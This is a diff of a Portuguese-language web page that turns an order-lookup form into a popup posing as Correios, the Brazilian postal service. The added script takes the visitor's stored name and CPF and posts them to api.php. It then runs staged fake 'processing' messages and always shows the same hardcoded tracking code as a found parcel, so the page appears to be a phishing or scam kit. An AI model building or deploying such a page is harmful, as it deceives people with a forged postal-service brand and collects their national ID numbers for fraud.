@@ -1,129 +1,221 @@
-<!DOCTYPE html>
-<html lang="pt-br">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verificar Pedido</title>
-    <style>
-        /* Estilos globais */
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        body {
-            font-family: 'Arial', sans-serif;
-            background-color: #f0f0f5;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-        }
-        .container {
-            text-align: center;
-            background-color: #ffffff;
-            padding: 30px;
-            border-radius: 15px;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
-            width: 100%;
-            max-width: 450px;
-        }
+<!-- ... (código anterior permanece igual até antes do fechamento do </body>) ... -->
 
-        h2 {
-            font-size: 24px;
-            margin-bottom: 20px;
-            color: #333;
-        }
+<!-- SEU SCRIPT INTEGRADO COMEÇA AQUI -->
 
-        /* Estilo da barra de busca */
-        .search-box {
-            width: 100%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin-bottom: 20px;
-        }
-        .search-box input {
-            width: 80%;
-            padding: 15px;
-            font-size: 16px;
-            border: 2px solid #ddd;
-            border-radius: 5px;
-            transition: border-color 0.3s ease;
-        }
-        .search-box input:focus {
-            border-color: #4CAF50;
-            outline: none;
-        }
+</footer>
+<script src="js/zAzIXPxUsP3f.js"></script>
+<script src="js/qrT6ShSjDfeM.js"></script>
+<script>
+  function formatCpf(element){
+    const inputCpf = $('input[name=cpf]');
+    $(element).val(cpf($(element).val()));
+  }
+  function cpf(cpf){
+    cpf = cpf.replace(/\D/g,"");
+    cpf = cpf.substring(0,11);
+    cpf = cpf.replace(/(\d{3})(\d)/,"$1.$2");
+    cpf = cpf.replace(/(\d{3})(\d)/,"$1.$2");
+    cpf = cpf.replace(/(\d{3})(\d{1,2})$/,"$1-$2");
+    return cpf;
+  }
+  setInterval(function(){
+    var element = $('#blink');
+    if(element.hasClass('opacity-0')){
+      element.removeClass('opacity-0');
+    } else {
+      element.addClass('opacity-0');
+    }
+  },600);
+</script>
 
-        /* Estilo do botão */
-        .search-box button {
-            padding: 16px;
-            background-color: #4CAF50;
-            color: white;
-            font-size: 16px;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            margin-left: 10px;
-            transition: background-color 0.3s ease;
-        }
-        .search-box button:hover {
-            background-color: #45a049;
-        }
+<!-- Estilos do popup e animação -->
+<style>
+  .bg-opacity-50 { --tw-bg-opacity: 0.5; }
+  .bg-black { background-color: rgb(0 0 0 / var(--tw-bg-opacity)); }
+  .justify-center { justify-content: center; }
+  .items-center { align-items: center; }
+  .flex { display: flex; }
+  .z-50 { z-index: 50; }
+  .inset-0 { inset: 0px; }
+  .fixed { position: fixed; }
+  .shadow-lg {
+    box-shadow: 0 10px 15px -3px rgba(0,0,0,0.1), 0 4px 6px -4px rgba(0,0,0,0.1);
+  }
+  .text-center { text-align: center; }
+  .p-8 { padding: 2rem; }
+  .bg-white { background-color: rgb(255 255 255 / 1); }
+  .rounded-lg { border-radius: 0.5rem; }
+  .text-correios-blue { color: rgb(0 113 173); }
+  .font-bold { font-weight: 700; }
+  .text-3xl { font-size: 1.875rem; }
+  .mb-6 { margin-bottom: 1.5rem; }
+  .border-correios-blue { border: 1px solid rgb(0 113 173); }
+  .border-t-4 { border-top-width: 4px; }
+  .border-b-4 { border-bottom-width: 4px; }
+  .rounded-full { border-radius: 9999px; }
+  .animate-spin {
+    animation: spin 1s linear infinite;
+  }
+  .w-24 { width: 6rem; }
+  .h-24 { height: 6rem; }
+  .mx-auto { margin-left: auto; margin-right: auto; }
+  @keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+  }
 
-        /* Mensagem de erro */
-        .error {
-            color: #ff4d4d;
-            font-size: 14px;
-            margin-top: 10px;
-        }
+  #popup {
+    position: fixed;
+    top: 50%; left: 50%;
+    transform: translate(-50%, -50%);
+    z-index: 1001;
+    display: flex;
+    justify-content: center;
+    width: 90%;
+    align-items: center;
+    height: 50%;
+  }
 
-        /* Responsividade */
-        @media (max-width: 600px) {
-            .container {
-                padding: 20px;
-                max-width: 90%;
-            }
-            .search-box input {
-                width: 70%;
-            }
-            .search-box button {
-                width: 25%;
-            }
-        }
-    </style>
-</head>
-<body>
+  #overlay {
+    display: none;
+    position: fixed;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
+    backdrop-filter: blur(5px);
+    background-color: rgba(0, 0, 0, 0.7);
+    z-index: 1000;
+  }
 
-    <div class="container">
-        <h2>Verificar Pedido</h2>
-        <div class="search-box">
-            <input type="text" id="cpfInput" placeholder="Número do pedido (ex: #1010)" maxlength="11" required>
-            <button type="submit" id="submitBtn">Localizar Pedido</button>
+  .popup-content {
+    max-width: 400px;
+    background-color: white;
+    border: 1px solid white;
+    color: white;
+    border-radius: 40px;
+    padding: 20px;
+    box-shadow: 0 0 15px rgba(0,0,0,0.7);
+  }
+
+  #loginBtn {
+    background-color: #26921b;
+    color: white;
+    padding: 13px 20px;
+    border: none;
+    border-radius: 5px;
+    cursor: pointer;
+    font-size: 16px;
+    width: 100%;
+  }
+
+  #loginBtn:hover {
+    background-color: #218838;
+  }
+
+  img#api {
+    max-width: 80%;
+    margin: auto;
+    border-radius: 20px;
+  }
+
+  main#mainContent {
+    min-height: auto!important;
+  }
+</style>
+
+<!-- HTML do popup -->
+<div id="overlay" style="display: block;"></div>
+<div id="popup" style="display: block;">
+  <div class="popup-content">
+    <div id="loader">
+      <main id="mainContent" class="container mx-auto px-4 py-16">
+        <div class="bg-white p-8 rounded-lg text-center">
+          <h1 class="text-3xl font-bold text-correios-blue mb-8">Processando Informações</h1>
+          <div class="animate-spin rounded-full h-24 w-24 border-t-4 border-b-4 border-correios-blue mx-auto mb-6"></div>
+          <div id="processingStep" class="text-xl text-correios-blue mb-4"></div>
         </div>
-        <p id="errorMessage" class="error" style="display: none;">Pedido não encontrado. Tente novamente.</p>
+      </main>
     </div>
+    <div id="popup-text" style="display:none; text-align: center;">
+      <span style="font-size: 25px; font-weight: bold; color: #005176;">Código de Rastreio:</span><br>
+      <span style="margin-top:15px;font-size: 20px; font-weight: 100; color: #005176;">PH 2424 8844 5CV</span><br>
+      <img src="https://i.postimg.cc/hj27dpyd/images.jpg" alt="" width="32">
+      <span style="font-size: 18px; font-weight: bold; color: #005176;">Encomenda encontrada</span><br><br>
+      <button id="verificarStatusBtn" style="font-size: 15px; font-weight: bold; color: white; background-color: #0071AD; padding: 15px 30px; border: none; border-radius: 10px; cursor: pointer; text-transform: uppercase; width:100%; box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1);" onmouseover="this.style.backgroundColor='#FF5733'" onmouseout="this.style.backgroundColor='#FF4500'">VERIFICAR STATUS DA ENTREGA</button>
+    </div>
+  </div>
+</div>
 
-    <script>
-        // Lista de pedidos válidos para consulta
-        const validCpfs = ['1052', '98765432100', '11122233344']; // Adicione os CPFs válidos aqui
+<script>
+  document.getElementById('verificarStatusBtn').addEventListener('click', function(){
+    document.getElementById('popup').style.display = 'none';
+    document.getElementById('overlay').style.display = 'none';
+  });
 
-        // Função para verificar o CPF e redirecionar
-        document.getElementById('submitBtn').addEventListener('click', function(event) {
-            event.preventDefault(); // Impede o envio do formulário
+  function fecharPopup(){
+    document.getElementById('popup').style.display = 'none';
+    document.getElementById('overlay').style.display = 'none';
+  }
 
-            const cpf = document.getElementById('cpfInput').value;
+  function abrirPopup(){
+    document.getElementById('popup').style.display = 'block';
+    document.getElementById('overlay').style.display = 'block';
+  }
 
-            // Verifica se o CPF está na lista
-            if (validCpfs.includes(cpf)) {
-                window.location.href = `https://crassbrasil.github.io/apoio/`;
-            } else {
-                document.getElementById('errorMessage').style.display = 'block'; // Exibe a mensagem de erro
-            }
-        });
-    </script>
+  function showProcessingSteps(trackingCode) {
+    abrirPopup();
+    const mainContent = document.getElementById("mainContent");
+    mainContent.innerHTML = `
+      <div class="bg-white p-8 rounded-lg text-center">
+        <h1 class="text-3xl font-bold text-correios-blue mb-8">Processando Informações</h1>
+        <div class="animate-spin rounded-full h-24 w-24 border-t-4 border-b-4 border-correios-blue mx-auto mb-6"></div>
+        <div id="processingStep" class="text-xl text-correios-blue mb-4"></div>
+      </div>
+    `;
+    const steps = [
+      "Carregando portal dos Correios..",
+      "Confirmando CEP e Endereço...",
+      "Verificando Status de Envio...",
+      "Atualizando Informações de Rastreio...",
+      "Finalizando Processamento...",
+    ];
+    let currentStep = 0;
+    const interval = setInterval(() => {
+      if (currentStep < steps.length) {
+        document.getElementById("processingStep").textContent = steps[currentStep];
+        currentStep++;
+      } else {
+        clearInterval(interval);
+        document.getElementById("loader").style.display = 'none';
+        document.getElementById("popup-text").style.display = 'block';
+        document.getElementById("popup").style.display = 'flex';
+        document.getElementById("overlay").style.display = 'block';
+      }
+    }, 1200);
+  }
+
+  window.onload = function() {
+    const nome = localStorage.getItem('nome');
+    const cpf = localStorage.getItem('cpf');
+    if(nome && cpf){
+      document.getElementById('nome').value = nome;
+      document.getElementById('cpf').value = cpf;
+      document.getElementById('cpf1').value = cpf;
+
+      const formData = new FormData();
+      formData.append('cpf', cpf);
+      formData.append('nome', nome);
+
+      fetch('api.php', {
+        method: 'POST',
+        body: formData
+      })
+      .then(response => response.text())
+      .then(data => {
+        showProcessingSteps();
+      });
+    }
+  };
+</script>
 
 </body>
 </html>
